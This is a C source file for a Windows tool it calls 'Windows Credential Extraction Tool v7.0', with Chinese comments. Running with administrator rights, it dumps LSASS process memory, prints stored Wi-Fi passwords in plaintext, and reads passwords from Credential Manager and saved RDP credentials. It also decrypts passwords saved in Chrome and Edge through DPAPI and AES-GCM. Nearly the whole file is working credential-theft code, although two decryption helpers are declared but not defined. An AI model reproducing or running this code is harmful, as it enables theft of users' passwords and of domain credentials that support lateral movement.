// laztool_v7.c
// 编译: x64 Native Tools Command Prompt
// cl /O2 /MT /Fe:LazTool.exe laztool_v7.c sqlite3.c /link wlanapi.lib dbghelp.lib credui.lib crypt32.lib bcrypt.lib shell32.lib

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <shlobj.h>
#include <wlanapi.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <wincred.h>
#include <shlwapi.h>
#include <dpapi.h>
#include <bcrypt.h>
#include "sqlite3.h"

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")

#ifndef WLAN_PROFILE_GET_PLAINTEXT
#define WLAN_PROFILE_GET_PLAINTEXT 0x00000002
#endif

// ------------------- 辅助函数 -------------------
BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = {0};
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, dwSize, &dwSize))
            fRet = Elevation.TokenIsElevated;
        CloseHandle(hToken);
    }
    return fRet;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

DWORD GetProcessPid(const wchar_t* procName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, procName) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
    return pid;
}

// ------------------- 模块1: LSASS 转储 -------------------
void DumpLsass() {
    printf("\n[+] ===== LSASS Memory Dump =====\n");
    if (!EnableDebugPrivilege()) {
        printf("[-] Failed to enable SeDebugPrivilege. Run as Admin.\n");
        return;
    }
    DWORD pid = GetProcessPid(L"lsass.exe");
    if (pid == 0) {
        printf("[-] lsass.exe not found.\n");
        return;
    }
    printf("[*] LSASS PID: %lu\n", pid);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed, error: %lu\n", GetLastError());
        return;
    }
    wchar_t dumpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, dumpPath);
    wcscat_s(dumpPath, MAX_PATH, L"lsass.dmp");
    HANDLE hFile = CreateFileW(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile failed, error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }
    BOOL success = MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (success) {
        printf("[+] LSASS dumped to: %S\n", dumpPath);
    } else {
        printf("[-] MiniDumpWriteDump failed, error: 0x%08X\n", GetLastError());
    }
    CloseHandle(hFile);
    CloseHandle(hProcess);
}

// ------------------- 模块2: Wi-Fi 明文密码 -------------------
void DumpWifiPasswords() {
    printf("\n[+] ===== Wi-Fi Passwords =====\n");
    HANDLE hClient = NULL;
    DWORD dwCurVersion = 0;
    DWORD dwResult = WlanOpenHandle(2, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        printf("[-] WlanOpenHandle failed: %lu. Check WLAN AutoConfig service.\n", dwResult);
        return;
    }
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) {
        printf("[-] No wireless interface found.\n");
        WlanCloseHandle(hClient, NULL);
        return;
    }
    int found = 0;
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        if (WlanGetProfileList(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, NULL, &pProfileList) == ERROR_SUCCESS) {
            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
                WLAN_PROFILE_INFO profile = pProfileList->ProfileInfo[j];
                DWORD flags = WLAN_PROFILE_GET_PLAINTEXT;
                DWORD granted = 0;
                LPWSTR xml = NULL;
                if (WlanGetProfile(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, profile.strProfileName, NULL, &xml, &flags, &granted) == ERROR_SUCCESS) {
                    wchar_t* keyStart = wcsstr(xml, L"<keyMaterial>");
                    if (keyStart) {
                        keyStart += wcslen(L"<keyMaterial>");
                        while (*keyStart && iswspace(*keyStart)) keyStart++;
                        wchar_t* keyEnd = wcsstr(keyStart, L"</keyMaterial>");
                        if (keyEnd) {
                            while (keyEnd > keyStart && iswspace(*(keyEnd-1))) keyEnd--;
                            wchar_t saved = *keyEnd;
                            *keyEnd = L'\0';
                            printf("[+] SSID: %-20S -> Password: %S\n", profile.strProfileName, keyStart);
                            *keyEnd = saved;
                            found++;
                        }
                    }
                    WlanFreeMemory(xml);
                }
            }
            WlanFreeMemory(pProfileList);
        }
    }
    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
    if (found == 0) printf("[-] No Wi-Fi passwords found.\n");
    else printf("[+] Total Wi-Fi passwords: %d\n", found);
}

// ------------------- 模块3: Windows Credential Manager -------------------
void DumpCredentialManager() {
    printf("\n[+] ===== Windows Credential Manager =====\n");
    PCREDENTIALW* creds = NULL;
    DWORD count = 0;
    if (!CredEnumerateW(NULL, 0, &count, &creds)) {
        printf("[-] CredEnumerate failed: %lu\n", GetLastError());
        return;
    }
    int found = 0;
    for (DWORD i = 0; i < count; i++) {
        printf("\n[*] Target: %S\n", creds[i]->TargetName ? creds[i]->TargetName : L"(null)");
        printf("    Username: %S\n", creds[i]->UserName ? creds[i]->UserName : L"(null)");
        if (creds[i]->CredentialBlobSize && creds[i]->CredentialBlob) {
            // Try as wide string
            if (creds[i]->CredentialBlobSize % 2 == 0) {
                wchar_t* pwd = (wchar_t*)creds[i]->CredentialBlob;
                int len = creds[i]->CredentialBlobSize / 2;
                if (pwd[len-1] == 0) len--;
                printf("    Password: %.*S\n", len, pwd);
            } else {
                printf("    Password (ANSI): %.*s\n", creds[i]->CredentialBlobSize, (char*)creds[i]->CredentialBlob);
            }
            found++;
        } else {
            printf("    Password: (empty)\n");
        }
    }
    CredFree(creds);
    if (found == 0) printf("[-] No credentials with passwords found.\n");
}

// ------------------- 模块4: DPAPI Demo -------------------
void DemonstrateDPAPI() {
    printf("\n[+] ===== DPAPI Test =====\n");
    wchar_t test[] = L"DPAPI_Test_Data_For_CurrentUser";
    DATA_BLOB in = { (BYTE*)test, (DWORD)((wcslen(test)+1)*sizeof(wchar_t)) };
    DATA_BLOB enc = {0}, dec = {0};
    if (!CryptProtectData(&in, L"Test", NULL, NULL, NULL, 0, &enc)) {
        printf("[-] CryptProtectData failed: %lu\n", GetLastError());
        return;
    }
    if (!CryptUnprotectData(&enc, NULL, NULL, NULL, NULL, 0, &dec)) {
        printf("[-] CryptUnprotectData failed: %lu\n", GetLastError());
        LocalFree(enc.pbData);
        return;
    }
    printf("[+] DPAPI works. Decrypted: %S\n", (wchar_t*)dec.pbData);
    LocalFree(enc.pbData);
    LocalFree(dec.pbData);
}

// ------------------- 模块5: Chromium 密码 -------------------
// 函数声明已在前面，这里给出实现
BYTE* DecryptDPAPIBlob(BYTE* pEncryptedData, DWORD dwDataSize, DWORD* pdwOutSize);
BOOL AesGcmDecrypt(const BYTE* key, DWORD keyLen, const BYTE* iv, DWORD ivLen, const BYTE* ciphertext, DWORD ciphertextLen, BYTE* plaintext, DWORD* plaintextLen);

void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserName) {
    wchar_t localStatePath[MAX_PATH];
    wcscpy_s(localStatePath, MAX_PATH, userDataPath);
    wcscat_s(localStatePath, MAX_PATH, L"\\Local State");

    HANDLE hFile = CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] %S not found: %S\n", browserName, localStatePath);
        return;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    char* jsonData = (char*)malloc(fileSize + 1);
    DWORD bytesRead = 0;
    ReadFile(hFile, jsonData, fileSize, &bytesRead, NULL);
    jsonData[fileSize] = '\0';
    CloseHandle(hFile);

    char* keyTag = strstr(jsonData, "\"encrypted_key\":\"");
    if (!keyTag) { free(jsonData); printf("[!] No encrypted_key in %S Local State\n", browserName); return; }
    keyTag += 18;
    char* keyEnd = strstr(keyTag, "\"");
    if (!keyEnd) { free(jsonData); return; }
    *keyEnd = '\0';

    DWORD base64Len = 0;
    CryptStringToBinaryA(keyTag, 0, CRYPT_STRING_BASE64, NULL, &base64Len, NULL, NULL);
    BYTE* base64Decoded = (BYTE*)malloc(base64Len);
    CryptStringToBinaryA(keyTag, 0, CRYPT_STRING_BASE64, base64Decoded, &base64Len, NULL, NULL);
    BYTE* encryptedKey = base64Decoded + 5;
    DWORD encryptedKeyLen = base64Len - 5;

    DWORD masterKeyLen = 0;
    BYTE* masterKey = DecryptDPAPIBlob(encryptedKey, encryptedKeyLen, &masterKeyLen);
    free(base64Decoded);
    if (!masterKey) { free(jsonData); printf("[!] Failed to decrypt master key for %S\n", browserName); return; }

    wchar_t loginDataPath[MAX_PATH];
    wcscpy_s(loginDataPath, MAX_PATH, userDataPath);
    wcscat_s(loginDataPath, MAX_PATH, L"\\Default\\Login Data");

    sqlite3* db;
    if (sqlite3_open16(loginDataPath, &db) != SQLITE_OK) {
        printf("[!] Cannot open %S Login Data (browser may be open)\n", browserName);
        free(masterKey);
        free(jsonData);
        return;
    }
    const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        printf("\n[+] ----- %S Saved Passwords -----\n", browserName);
        int count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url = (const char*)sqlite3_column_text(stmt, 0);
            const char* username = (const char*)sqlite3_column_text(stmt, 1);
            const BYTE* encryptedPwd = (const BYTE*)sqlite3_column_blob(stmt, 2);
            int encryptedPwdLen = sqlite3_column_bytes(stmt, 2);
            if (encryptedPwdLen <= 15) continue;
            const BYTE* iv = encryptedPwd + 3;
            const BYTE* ciphertext = encryptedPwd + 15;
            DWORD ciphertextLen = encryptedPwdLen - 15;
            BYTE* plaintext = (BYTE*)malloc(ciphertextLen);
            DWORD plaintextLen = 0;
            if (AesGcmDecrypt(masterKey, masterKeyLen, iv, 12, ciphertext, ciphertextLen, plaintext, &plaintextLen)) {
                plaintext[plaintextLen] = '\0';
                printf("  URL: %s\n", url);
                printf("  Username: %s\n", username);
                printf("  Password: %s\n\n", plaintext);
                count++;
            }
            free(plaintext);
        }
        if (count == 0) printf("  [No saved passwords]\n");
        sqlite3_finalize(stmt);
    } else {
        printf("[!] Failed to query %S Login Data\n", browserName);
    }
    sqlite3_close(db);
    free(masterKey);
    free(jsonData);
}

// ------------------- 模块6: RDP 凭据 -------------------
void DumpRDPCredentials() {
    printf("\n[+] ===== RDP Saved Credentials =====\n");
    PCREDENTIALW* creds = NULL;
    DWORD count = 0;
    if (CredEnumerateW(NULL, 0, &count, &creds)) {
        int found = 0;
        for (DWORD i = 0; i < count; i++) {
            if (wcsstr(creds[i]->TargetName, L"TERMSRV/") != NULL) {
                printf("\n[*] Target: %S\n", creds[i]->TargetName);
                printf("    Username: %S\n", creds[i]->UserName);
                if (creds[i]->CredentialBlobSize > 0) {
                    printf("    Password: %S\n", (wchar_t*)creds[i]->CredentialBlob);
                }
                found++;
            }
        }
        CredFree(creds);
        if (found == 0) printf("[-] No RDP credentials found.\n");
    } else {
        printf("[-] CredEnumerate failed: %lu\n", GetLastError());
    }

    printf("\n[*] RDP Connection History (registry):\n");
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Terminal Server Client\\Servers", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD index = 0;
        wchar_t name[256];
        DWORD size = 256;
        while (RegEnumKeyExW(hKey, index++, name, &size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            printf("  %S\n", name);
            size = 256;
        }
        RegCloseKey(hKey);
    } else {
        printf("  [No history found]\n");
    }
}

// ------------------- 主函数 -------------------
int main() {
    SetConsoleOutputCP(CP_UTF8);
    printf("=========================================================\n");
    printf("      Windows Credential Extraction Tool v7.0          \n");
    printf("                (Run as Administrator)                  \n");
    printf("=========================================================\n");
    if (!IsElevated()) {
        printf("\n[-] This tool requires Administrator privileges.\n");
        printf("    Right-click -> Run as Administrator.\n");
        getchar();
        return 1;
    }
    printf("[+] Admin privileges confirmed.\n");

    DumpLsass();               // 可注释掉以节省时间
    DumpWifiPasswords();
    DumpCredentialManager();
    DemonstrateDPAPI();

    wchar_t appDataLocal[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataLocal))) {
        wchar_t chromePath[MAX_PATH];
        wcscpy_s(chromePath, MAX_PATH, appDataLocal);
        wcscat_s(chromePath, MAX_PATH, L"\\Google\\Chrome\\User Data");
        ExtractChromePasswords(chromePath, L"Chrome");

        wchar_t edgePath[MAX_PATH];
        wcscpy_s(edgePath, MAX_PATH, appDataLocal);
        wcscat_s(edgePath, MAX_PATH, L"\\Microsoft\\Edge\\User Data");
        ExtractChromePasswords(edgePath, L"Edge");
    } else {
        printf("[-] Failed to get Local AppData folder.\n");
    }

    DumpRDPCredentials();

    printf("\n[*] All modules completed. Press Enter to exit.\n");
    getchar();
    return 0;
}
